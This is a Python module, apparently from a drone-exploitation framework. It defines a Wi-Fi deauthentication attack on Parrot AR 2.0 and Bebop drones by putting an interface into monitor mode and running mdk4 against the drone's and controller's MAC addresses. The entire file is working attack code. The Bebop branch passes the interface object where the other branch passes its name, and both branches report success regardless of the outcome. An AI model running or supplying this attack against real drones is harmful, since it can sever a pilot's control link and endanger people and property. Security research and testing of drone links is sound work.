from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.DEAUTH],
)
class DeauthAttackParrot(BaseAttackScript):
    def __init__(self, target_info: DroneTargetInfo):
        super().__init__(target_info); self.exec = CommandExecutor()

    def attack(self) -> AttackResult:
        pre = self._ensure_interface_mode(InterfaceMode.MONITOR)
        print(f"Ensuring interface mode: {pre.status}")
        if not pre.status: return pre

        model = self.target_info.model
        if model == Model.PARROT_AR2:
            return self._ar2_deauth()
        elif model == Model.PARROT_BEBOP:
            return self._bebop_deauth()
        return AttackResult(False, "", "", f"Unsupported model: {model}")

    def _ar2_deauth(self) -> AttackResult:
        print("Starting AR 2.0 deauth attack")
        cmd = ["mdk4", self.target_info.interface.iface_name, "d",
                               "-c", str(self.target_info.channel),
                               "-B", self.target_info.drone_mac, "-S", self.target_info.controller_mac]
        r = self.exec.execute(cmd, timeout=20, sudo=self.target_info.use_sudo, exec_in_new_thread=False)  # Use current thread for execution for more interactivity
        print("AR 2.0 deauth attack executed")
        return AttackResult(True, r.stdout, r.stderr, "Deauth (AR 2.0) complete")

    def _bebop_deauth(self) -> AttackResult:
        cmd = ["mdk4", self.target_info.interface, "d", "-c", str(self.target_info.channel), "-B", self.target_info.drone_mac]
        r = self.exec.execute(cmd, timeout=20, sudo=self.target_info.use_sudo)
        return AttackResult(True, r.stdout, r.stderr, "Deauth (Bebop) complete")
